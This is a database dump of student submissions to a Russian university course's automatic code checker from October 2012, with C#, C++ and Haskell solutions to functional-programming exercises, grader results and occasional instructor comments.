(2516, 68, '3607492', '2012-10-22 09:13:39', 1, 'sing System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void zeroDigits(int[] arr,int number)\r\n        {\r\n            int power = 1;\r\n            for (int i = 0; i < number; i++) power *= 10;\r\n\r\n            int[] c = arr.Select(x => power * (x / power)).ToArray();\r\n            foreach (int item in c)\r\n                Console.Write("{0} ",item);\r\n            Console.ReadKey();\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 551,55423,123456,2341};\r\n\r\n            Program.zeroDigits(a,2);\r\n\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2517, 78, '3607492', '2012-10-22 09:28:55', 1, 'pascal = [1]:(map ( -> 1:(zipWith (+) b (tail b))++[1]) pascal)', '<br/>Тесты успешно пройдены!'),
(2518, 74, '3607492', '2012-10-22 12:15:08', 0, '\r\ndata Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\ndata Tree2 b = Leaf b | Branch b (Tree2 b) (Tree2 b)\r\n\r\nfoldTree (f,g) el Empty = g el\r\nfoldTree (f,g) el (Node d (x) (y)) = f (f el d) (f (foldTree (f,g) el x) (foldTree (f,g) el y))\r\n\r\nfoldTree2 (f,g) (Leaf b) = g b\r\nfoldTree2 (f,g) (Branch d a b) =f d (f (foldTree2 (f,g) a) (foldTree2 (f,g) b))\r\n\r\nsumPos a = (foldTree ((x y->if (x>0) then (x+y) else y),id) 0 a)\r\nsumPos2 a = foldTree2 ((+),id) a\r\n-- main =  print (sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty)))\r\n-- print (sumPos2 (Branch 1 (Branch 2 (Leaf 1) (Leaf 2) ) (Leaf 2)))', '<br/>Тесты успешно пройдены!'),
(2519, 74, '3607492', '2012-10-22 12:21:15', 2, 'data Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\ndata Tree2 b = Leaf b | Branch b (Tree2 b) (Tree2 b)\r\n\r\nfoldTree (f,g) el Empty = g el\r\nfoldTree (f,g) el (Node d (x) (y)) = f (f el d) (f (foldTree (f,g) el x) (foldTree (f,g) el y))\r\n   --- Нет, на самом деле катаморфизм, это не совсем это. Катаморфизм - это набор функция, котороми мы как бы\r\n   --- заменяем конструкторы - и вычисляем то, что получится. Те если у дерева два конструктора, \r\n   --- и у одного два параметра, а у другого - 0 параметров, то проще значит в катаморфизме дб две функции,\r\n   --- и у одной два параметра, а у другой - ноль (те константа)\r\n   --- Попробуйте так переделать ,пожалуйста (ну или можете просто взять у кого-нибудь конспект \r\n   --- и списать определение :)\r\n\r\nfoldTree2 (f,g) (Leaf b) = g b\r\nfoldTree2 (f,g) (Branch d a b) =f (g d) (f (foldTree2 (f,g) a) (foldTree2 (f,g) b))\r\n\r\nsumPos a = (foldTree ((x y->if (x>0) then (x+y) else y),id) 0 a)\r\nsumPos2 a = foldTree2 ((l r),const 1) a\r\n-- main =  print (sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty)))\r\n-- print (sumPos2 (Branch 1 (Branch 2 (Leaf 1) (Leaf 2) ) (Leaf 2)))', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2520, 74, '3607492', '2012-10-22 12:29:50', 2, '  --- Нет, это не то, что называется катаморфизм..\r\n  --- foldTree немного похож, действительно там дб две функции\r\n  --- но у них дб столько же параметров, сколько у компьютеров\r\n  --- те 3 и 0\r\ndata Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\ndata Tree2 b = Leaf b | Branch b (Tree2 b) (Tree2 b)\r\n\r\nfoldTree (f,g) el Empty = g el\r\nfoldTree (f,g) el (Node d (x) (y)) = f (f el d) (f (foldTree (f,g) el x) (foldTree (f,g) el y))\r\n\r\nfoldTree2 (f,g,h) (Leaf b) = g b\r\nfoldTree2 (f,g,h) (Branch d a b) =h (g d) (f (foldTree2 (f,g,h) a) (foldTree2 (f,g,h) b))\r\n\r\nsumPos a = (foldTree ((x y->if (x>0) then (x+y) else y),id) 0 a)\r\n\r\nsumPos2 a = foldTree2 ((+),id,(+)) a\r\n\r\ntreeHeight2 a = foldTree2 ((l r -> 1 + max l r ),const 1,(l r -> max l r)) a', '<br/>Тесты успешно пройдены!'),
(2521, 68, 'erwert', '2012-10-22 12:55:20', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace linq {\r\n\r\n class Pg {\r\n\r\n	public static int [] nonZeroLastDigits(int[] a, int n){\r\n\r\n		int m = Convert.ToInt32(System.Math.Pow(10, n));\r\n\r\n		return a.Select(x => m*(x/m)).ToArray();\r\n\r\n	}\r\n\r\n	\r\n\r\n	static void Main() {\r\n\r\n		int[] a = {354, 245, 951, 331};\r\n\r\n		foreach(int val in nonZeroLastDigits(a, 2))\r\n\r\n			Console.WriteLine(val);\r\n\r\n	}\r\n\r\n }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2522, 67, 'erwert', '2012-10-22 12:55:35', 1, '#include <algorithm>\r\n\r\n#include <stdio.h>\r\n\r\n#include <math.h>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nvoid nonZeroLastDigits(int a[], int size, int n){\r\n\r\n	int b[size];\r\n\r\n	int m = (int) pow(10, n);\r\n\r\n	transform(a, a + size, b, [m] (int i) { return m*(i/10); });\r\n\r\n	for (i = 0; i < size; i++)\r\n\r\n		printf("%d ", b[i]);\r\n\r\n}\r\n\r\n\r\n\r\nint main(){\r\n\r\n	int a[] = {14,30,5,13};\r\n\r\n	int n = 4;\r\n\r\n	nonZeroLastDigits(a, n, 2);\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2523, 60, 'jogrms', '2012-10-22 13:02:27', 1, '#include <iostream>\r\n#include <algorithm>\r\n\r\nvoid nonZeroLastDigits(int* a, int len) {\r\n    int b[len];\r\n    std::transform(a, a + len, b, [] (int i) { return i % 10; });\r\n    int* end = std::remove_if(b, b + len, [] (int i) { return i == 0; });\r\n\r\n    std::for_each(b, end, [] (int i) { std::cout << i << " "; });\r\n}\r\n\r\nint main() {\r\n    int a[] = {354, 20, 9, 31};\r\n    nonZeroLastDigits(a, 4);\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2524, 69, '787463', '2012-10-22 13:16:07', 1, 'bigSin x = head (filter (>=x) (map sin [1..]))', '<br/>Тесты успешно пройдены!'),
(2525, 70, '787463', '2012-10-22 13:16:35', 1, 'myFilter f xs = foldr (x res -> if f x then x:res else res) [] xs', '<br/>Тесты успешно пройдены!'),
(2526, 71, '787463', '2012-10-22 13:17:06', 0, 'approxSum [] e = 0\r\napproxSum (x:xs) e = if x < e then 0 else x + approxSum xs e\r\n\r\nz = approxSum [1/i^2 | i <- [1..]] 0.000001', 'Не удалось вычислить выражение "let x = approxSum [sin i/i | i<-[1..]] in x < 1.1", проверьте правильность синтаксиса'),
(2527, 59, 'jogrms', '2012-10-22 13:17:11', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static int[] nonZeroLastDigits(int[] a)\r\n        {\r\n            return a.Select(x => x % 10).Where(x => x != 0).ToArray();\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 354, 20, 9, 31 };\r\n            int[] b = nonZeroLastDigits(a);\r\n            foreach (int i in b)\r\n            {\r\n                System.Console.WriteLine(i);\r\n            }\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2528, 71, '787463', '2012-10-22 13:19:16', 0, 'approxSum'' [] e = 0\r\napproxSum'' (x:xs) e = if x < e then 0 else x + approxSum'' xs e\r\napproxSum xs = approxSum'' xs 0.000001\r\n\r\nz = approxSum [1/i^2 | i <- [1..]]', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2529, 71, '787463', '2012-10-22 13:20:22', 1, 'approxSum'' [] e = 0\r\napproxSum'' (x:xs) e = if abs x < e then 0 else x + approxSum'' xs e\r\napproxSum xs = approxSum'' xs 0.000001\r\n\r\nz = approxSum [1/i^2 | i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2530, 72, '787463', '2012-10-22 13:20:55', 1, 'mask = 0:0:0:0:0:1:1:mask\r\nweekendExpences xs = sum (zipWith (*) xs mask)', '<br/>Тесты успешно пройдены!'),
(2531, 73, '787463', '2012-10-22 13:21:30', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))', '<br/>Тесты успешно пройдены!'),
(2532, 74, '787463', '2012-10-22 13:21:57', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) =\r\n    let\r\n      lres = foldTree f e l\r\n      rres = foldTree f e r\r\n    in f x lres rres\r\n\r\nsumPos t = foldTree (x lres rres -> if x > 0 then x + lres + rres else lres + rres) 0 t', '<br/>Тесты успешно пройдены!'),
(2533, 75, '787463', '2012-10-22 13:23:16', 1, 'foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nfoldr f e [] = e\r\nfoldr f e (x:xs) = f x (foldr f e xs)\r\n\r\nфаза 1.\r\na1 -> a2 -> a3 -> a4\r\n\r\nфаза 2.\r\n(x:xs) имеет тип a3 => a3 = [a5]\r\nf x (foldr f e xs) => f функция с двумя арументами => a1 = a6 -> a7 -> a8\r\nитог: foldr :: (a6 -> a7 -> a8) -> a2 -> [a5] -> a4\r\n\r\nфаза 3.\r\nиз первого правила видно, что e есть и в параметрах, и в результате => a2 = a4\r\nx встречается в (x:xs) типа [a5] => a6 = a5\r\nfoldr f e xs - вызов foldr с типом результата a4 => a7 = a4\r\nf x (foldr f e xs) - результат работы f, т.е. a8, и результат работы foldr, т.е. a4 => a8 = a4\r\nитог: foldr :: (a5 -> a4 -> a4) -> a4 -> [a5] -> a4', '<br/>Тесты успешно пройдены!'),
(2534, 76, '787463', '2012-10-22 13:23:40', 1, 'data Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\nclass Shape a where\r\n    perimeter :: a -> Double\r\n\r\ninstance Shape Rect where\r\n    perimeter (Rect x y) = 2*x + 2*y\r\n\r\ninstance Shape Circle where\r\n    perimeter (Circle r) = 2*pi*r', '<br/>Тесты успешно пройдены!'),
(2535, 68, '787463', '2012-10-22 13:24:13', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task_16_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		static int[] zeroDigits(int[] array, int n)\r\n\r\n		{\r\n\r\n			int tenPower = (int) Math.Pow(10, n);\r\n\r\n			return array.Select(x => x / tenPower * tenPower).ToArray();\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int[] a = {563, 5643, 76796};\r\n\r\n			int n = 2;\r\n\r\n			\r\n\r\n			foreach (int x in zeroDigits(a, n))\r\n\r\n			{\r\n\r\n				Console.Write("{0} ", x);\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2536, 67, '787463', '2012-10-22 13:24:46', 1, '#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n#include <math.h>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nvoid zeroDigits(const int array[], size_t const arrayLength, int const n) {\r\n\r\n	int res[arrayLength];\r\n\r\n	int const tenPower = pow(10, n);\r\n\r\n	\r\n\r\n	transform(array, array + arrayLength, res, [tenPower] (int i) { return i / tenPower * tenPower; });\r\n\r\n	\r\n\r\n	for (int i = 0; i < arrayLength; ++i) {\r\n\r\n		cout << res[i] << " ";\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\nint main () {\r\n\r\n	const int array[] = {563, 5643, 76796};\r\n\r\n	int const arrayLength = sizeof array / sizeof array[0];\r\n\r\n	int const n = 2;\r\n\r\n	\r\n\r\n	zeroDigits(array, arrayLength, n);\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2537, 77, '787463', '2012-10-22 13:26:08', 1, 'getDigit x num l r\r\n  | l == r || l == r - 1 = if (num + r)^2 < x then r else l\r\n  | otherwise =\r\n    let\r\n      mid = (l+r) `div` 2\r\n    in if (num + mid)^2 < x then getDigit x num mid r else getDigit x num l mid\r\n\r\nsqrt2'' x num = \r\n    let\r\n      dig = getDigit x num 0 9\r\n    in dig : sqrt2'' (100*x) (10*(num + dig))\r\n\r\nsqrt2 = sqrt2'' 2 0', '<br/>Тесты успешно пройдены!'),
(2538, 78, '787463', '2012-10-22 13:26:50', 1, 'pascal = [1]:(zipWith (xs ys -> 1 : zipWith (+) xs (tail ys ++ [0])) pascal pascal)', '<br/>Тесты успешно пройдены!'),
(2539, 71, 'erwert', '2012-10-22 13:45:47', 1, 'approxSum (h:hs) = if (abs h) >=  0.000001 then approxSum hs + h else 0\r\nz = approxSum [ 1 / (t * t) | t <- [1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2540, 70, 'erwert', '2012-10-22 13:57:23', 1, 'myFilter f h = foldr (x y -> if f x then (x:y) else y) [] h', '<br/>Тесты успешно пройдены!'),
(2541, 79, '2118411', '2012-10-22 13:58:46', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int n;\r\n\r\n\r\n\r\n            do\r\n\r\n            {\r\n\r\n                Console.Write("x <- ");\r\n\r\n            } while (!Int32.TryParse(Console.ReadLine(), out n));\r\n\r\n\r\n\r\n            int count = 0;\r\n\r\n            \r\n\r\n            foreach (int x in digits(n))\r\n\r\n            {\r\n\r\n                if (count >= 100)\r\n\r\n                    break;\r\n\r\n\r\n\r\n                Console.Write("{0}, ", x);\r\n\r\n                count++;\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<int> digits(int n)\r\n\r\n        {\r\n\r\n            int k = 1;\r\n\r\n\r\n\r\n            // Без ведущих нулей\r\n\r\n            while (k < n)\r\n\r\n            {\r\n\r\n                k *= 10;\r\n\r\n            }\r\n\r\n\r\n\r\n            for (; ; )\r\n\r\n            {\r\n\r\n                yield return k / n;\r\n\r\n                k = (k % n)*10;\r\n\r\n\r\n\r\n                while (k < n)\r\n\r\n                {\r\n\r\n                    k *= 10;\r\n\r\n                    yield return 0;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2542, 80, '787463', '2012-10-22 14:01:04', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_19_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static IEnumerable<KeyValuePair<int, int>> Kantor()\r\n\r\n		{\r\n\r\n			for (int i = 0; ; i++)\r\n\r\n			{\r\n\r\n				int root = (int) Math.Sqrt(i);\r\n\r\n				int sqr = root * root;\r\n\r\n				int offset = i - sqr;\r\n\r\n				if (offset >= root + 1)\r\n\r\n				{\r\n\r\n					yield return new KeyValuePair<int, int>(2*root + 1 - offset, root + 1);\r\n\r\n				} else\r\n\r\n				{\r\n\r\n					yield return new KeyValuePair<int, int>(root + 1, offset + 1);\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			for (int i = 0; i < 100; i++)\r\n\r\n			{\r\n\r\n				Console.Write("{0} ", Kantor().ElementAt(i));\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2543, 65, 'jogrms', '2012-10-22 14:07:52', 1, 'cantor :: [(Int, Int)]\r\ncantor = concat [surface(i) | i <- [1..]] where\r\n    surface i = (i, i):concat [[(i, n), (n, i)] | n <- [1 .. i - 1]]\r\n', '<br/>Тесты успешно пройдены!'),
(2544, 80, '2118411', '2012-10-22 14:08:00', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int count = 0;\r\n\r\n\r\n\r\n            foreach (Tuple<UInt64, UInt64> t in cantor())\r\n\r\n            {\r\n\r\n                if (count >= 100)\r\n\r\n                    break;\r\n\r\n\r\n\r\n                Console.Write("({0}, {1}), ", t.Item1, t.Item2);\r\n\r\n                count++;\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<Tuple<UInt64, UInt64>> cantor()\r\n\r\n        {\r\n\r\n            for (UInt64 i = 0; ; i++)\r\n\r\n            {\r\n\r\n                UInt64 ir = (UInt64)Math.Sqrt(i);\r\n\r\n                UInt64 irs = ir * ir;\r\n\r\n\r\n\r\n                if (i - irs < ir)\r\n\r\n                    yield return new Tuple<UInt64, UInt64>(i - irs + 1, ir + 1);\r\n\r\n                else\r\n\r\n                    yield return new Tuple<UInt64, UInt64>(ir + 1, i - irs - ir + 1);\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2545, 72, 'erwert', '2012-10-22 14:43:34', 1, 'weekendExpences l = sum [ l !! i + l !! j | (i, j) <- [(5+7*t,6+7*t) | t <- [0..n]]]\r\n	where n = div (length l - 5)  7\r\n', '<br/>Тесты успешно пройдены!'),
(2546, 79, '787463', '2012-10-22 14:52:10', 1, '  --- Зачитано, но только вызов у вас очень неэффективный, для того чтобы сосчитать каждый элемент\r\n  --- у вас все элементы будут вычиисляться с самого начала.\r\n  --- Лучше написать foreach + дополнительный счетчик, чтобы вовремя выйти из foreach\r\nusing System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_19_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static IEnumerable<int> digits(int n)\r\n\r\n		{\r\n\r\n			int x = 10;\r\n\r\n			for (int i = 0; ; i++)\r\n\r\n			{\r\n\r\n				if (x < n)\r\n\r\n				{\r\n\r\n					yield return 0;\r\n\r\n				} else\r\n\r\n				{\r\n\r\n					int res = x / n;\r\n\r\n					yield return res;\r\n\r\n					x -= res*n;\r\n\r\n				}\r\n\r\n				x *= 10;\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			Console.WriteLine("Enter integer number:");\r\n\r\n			int n = int.Parse(Console.ReadLine());\r\n\r\n			\r\n\r\n			for (int i = 0; i < 100; i++)\r\n\r\n			{\r\n\r\n				Console.Write("{0} ", digits(n).ElementAt(i));\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2547, 66, 'jogrms', '2012-10-22 15:04:43', 1, 'generalizedCantor :: Int -> [[Int]]\r\ngeneralizedCantor k = concat [surface k i | i <- [1..]] where\r\n    surface 1 i = [[i]]\r\n    surface k i = map (i:) (cube (k-1) i) ++ [x:y | x <- [1..i - 1], y <- surface (k-1) i]\r\n\r\n    cube 0 _ = [[]]\r\n    cube k i = [x:y | x <- [1..i], y <- cube (k-1) i]\r\n', '<br/>Тесты успешно пройдены!'),
(2548, 59, '6774563', '2012-10-22 16:07:09', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task13_1\r\n{\r\n    internal sealed class Program\r\n    {\r\n        private static IEnumerable<int> NonZeroLastDigits(IEnumerable<int> list)\r\n        {\r\n            return list.Select(a => a%10).Where(a => a != 0);\r\n            // Или, как вариант return list.Where(a => a%10 != 0).Select(a => a%10);\r\n        }\r\n\r\n        public static void Main()\r\n        {\r\n            foreach (int d in NonZeroLastDigits(new [] {10, 22, 30, 6, 64, 70 }))\r\n            {\r\n                Console.WriteLine(d);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2549, 69, '383483', '2012-10-22 16:24:03', 1, 'bigSin n = head ([sin x|x<-[1..],(sin x)>=n])', '<br/>Тесты успешно пройдены!'),
(2550, 70, '383483', '2012-10-22 16:31:55', 1, 'myFilter f xs = foldr (x res -> if (f x) then (x:res) else res) [] xs', '<br/>Тесты успешно пройдены!'),
(2551, 56, '442421', '2012-10-22 16:37:38', 0, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs)| x<-[1..n], xs<-gen n (k-1) ]\r\n\r\n-- высылаю исправленное решение, вчера было очень поздно когда я решал задачу и сразу не сообразил\r\n--\r\n--предыдущее решение, на мой взгляд, правильное. Вероятно оно не работает из-за того, что функция filter\r\n-- работает медленно, либо из-за того, что filter не работает со списками длины 2^27 \r\n-- еще у меня было решение, которое вызывало переполнение стека \r\n', 'Не удалось вычислить выражение "allLists 1 1", проверьте правильность синтаксиса'),
(2552, 60, '6774563', '2012-10-22 16:38:34', 1, '#include "stdio.h"\r\n#include "conio.h"\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int *arr, int len) {\r\n	int *mapped = new int[len];\r\n	transform(arr, arr + len, mapped, [] (int a) { return a % 10; });\r\n	int *end = remove_if(mapped, mapped + len, [] (int a) { return a == 0; });\r\n	for (int *i = mapped; i != end; ++i) {\r\n		printf("%d\r\n", *i);\r\n	}\r\n   --- Тут надо бы, конечно, удалить mapped, а то будет утечка памяти\r\n}\r\n\r\nint main() {\r\n	int arr[] = { 10, 22, 30, 6, 64, 70 };\r\n	nonZeroLastDigits(arr, 6);\r\n	getch();\r\n\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2553, 56, '442421', '2012-10-22 16:39:09', 1, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs)| x<-[1..n], xs<-allLists n (k-1) ]\r\n\r\n-- высылаю исправленное решение, вчера было очень поздно когда я решал задачу и сразу не сообразил\r\n--\r\n--предыдущее решение, на мой взгляд, правильное. Вероятно оно не работает из-за того, что функция filter\r\n-- работает медленно, либо из-за того, что filter не работает со списками длины 2^27 \r\n    --- Скорее всего из-за этого, да. 2^27 это довольно много, вообще-то.\r\n    --- Без крайней необходимости в Хаскеле такие списки лучше не заводить, конечно.\r\n-- еще у меня было решение, которое вызывало переполнение стека \r\n', '<br/>Тесты успешно пройдены!'),
(2554, 72, '3742311', '2012-10-22 16:48:44', 1, 'weekendExpences l = fst (foldl ((s, d) x -> if d > 4 then (s + x, mod (d + 1) 7) else (s, d + 1)) (0, 0) l)', '<br/>Тесты успешно пройдены!'),
(2555, 60, '4169333', '2012-10-22 16:51:30', 1, '#include "stdafx.h"\r\n#include <algorithm>   \r\n#include <iostream>\r\n#include <conio.h>\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits (int a[],int n)\r\n{\r\n	 int* end = remove_if (a, a+n, [] (int i) { return i % 10==0; });\r\n	 int k;\r\n	 for (int j=0; j<n; j++)\r\n		if (a+j== end) \r\n		{\r\n				k =j;\r\n		}\r\n            --- можно просто k = end - a;  \r\n            --- без всякого цикла\r\n	 int*  b = new int[n];	  \r\n	 transform (a, a+k, b, [] (int i) { return i % 10; }); \r\n	 cout << "Result: ";\r\n	 for (int i=0; i<k; i++)\r\n	 { \r\n		cout << " " << b[i];\r\n	 }\r\n    --- Тут лучше delete [] b; а то будет утечка памяти\r\n}\r\n\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[] = { 11,11,11,11,10,20,30,44,55,111};\r\n	int n=10;\r\n    nonZeroLastDigits(a,n);\r\n	getch();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2556, 59, '4169333', '2012-10-22 16:52:55', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _1_22_10\r\n{\r\n    class Program\r\n    {\r\n        static int[] nonZeroLastDigits (int [] a)\r\n        {\r\n            int []b=  a.Select(x => x % 10).Where(x => x % 10 !=0).ToArray();\r\n            return b;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = {10,20,40,360,661,777};\r\n            int [] b = nonZeroLastDigits(a);\r\n            Console.WriteLine("Result: ");\r\n            for (int i=0; i< b.Length; i++)\r\n            {\r\n                Console.WriteLine(" " + b[i]);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2557, 71, '383483', '2012-10-22 16:53:16', 1, 'z = approxSum [1/(i^2)|i<-[1..]]\r\napproxSum (x:xs) = if ((abs x)>0.000001) then x + approxSum xs else 0', '<br/>Тесты успешно пройдены!'),
(2558, 65, '4169333', '2012-10-22 16:53:45', 1, 'cantor= [(x,s-x+1)| s<- [1..], x<- [1..s]]\r\n-- Перебираем по "главным" диагоналям', '<br/>Тесты успешно пройдены!'),
(2559, 68, '6774563', '2012-10-22 16:55:51', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task16_1\r\n{\r\n    internal sealed class Program\r\n    {\r\n        // Мне кажется, что лучше приучать людей к именованию по принятому стилю языка. \r\n        // В C# методы принято называть с большой буквы, а у Вас в условиях с маленькой :)\r\n           --- ОК, хорошее замечание, вы правы наверное, но мне хотелось подчеркнуть, что\r\n           --- и на С++ и на C# это в сущности одна функция. Но теперь в основном будет только C#,\r\n           --- может воспользуюсь вашим советом..\r\n        private static IEnumerable<int> ZeroDigits(IEnumerable<int> list, int n)\r\n        {\r\n            int pow10 = 1;\r\n            for (int i = 0; i < n; ++i)\r\n            {\r\n                pow10 *= 10;\r\n            }\r\n            return list.Select(a => a/pow10*pow10);\r\n        }\r\n\r\n        public static void Main()\r\n        {\r\n            foreach(int a in ZeroDigits(new [] {563, 5643, 76796}, 2))\r\n            {\r\n                Console.WriteLine(a);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2560, 67, '6774563', '2012-10-22 17:03:31', 1, '#include "stdio.h"\r\n#include "conio.h"\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nvoid zeroDigits(int *a, int size, int n) {\r\n	int pow10 = 1;\r\n	for (int i = 0; i < n; ++i) {\r\n		pow10 *= 10;\r\n	}\r\n\r\n	transform(a, a + size, a, [pow10] (int i) { return i / pow10 * pow10; });\r\n}\r\n\r\nint main() {\r\n	int len = 3;\r\n	int arr[] = { 563, 5643, 76796 };\r\n	zeroDigits(arr, len, 2);\r\n\r\n	for (int i = 0; i < len; ++i) {\r\n		printf("%d\r\n", arr[i]);\r\n	}\r\n	getch();\r\n\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2561, 73, '3742311', '2012-10-22 17:06:21', 0, 'fibs = 0:1:(zipWith (+) fibs (tail fibs))', 'Выражение имеет неправильное значение: take 10 fibs'),
(2562, 73, '3742311', '2012-10-22 17:06:46', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))', '<br/>Тесты успешно пройдены!'),
(2563, 72, '383483', '2012-10-22 17:07:06', 1, 'lst = 0:0:0:0:0:1:1:lst\r\nweekendExpences xs = sum (zipWith (*) xs lst)', '<br/>Тесты успешно пройдены!'),
(2564, 60, '532002', '2012-10-22 17:15:25', 1, '#include "stdafx.h"\r\n\r\n\r\n\r\n#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n#include <conio.h>\r\n\r\n#include <vector>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nvoid nonZeroLastDigits(int a[],int size)\r\n\r\n{  \r\n\r\n\r\n\r\n	\r\n\r\n	int b[100];\r\n\r\n	transform(a,a+size,b,[] (int i){return i%10;});	\r\n\r\n	int* pbegin = b;                          // ^\r\n\r\n	int* pend = b+size;\r\n\r\n	int* cur = remove_if(pbegin,pend,[] (int i) {return i==0;});\r\n\r\n	for(int* p=pbegin;p!=cur;p++){\r\n\r\n		cout<<*p<<" ";\r\n\r\n\r\n\r\n	}\r\n\r\n\r\n\r\n\r\n\r\n}\r\n\r\n	     \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n	\r\n\r\n\r\n\r\n	int a[7] = {4,6,12,70,41,17,20};\r\n\r\n	\r\n\r\n	nonZeroLastDigits(a,sizeof(a)/sizeof(int));\r\n\r\n	getch();\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2565, 73, '383483', '2012-10-22 17:16:51', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))', '<br/>Тесты успешно пройдены!'),
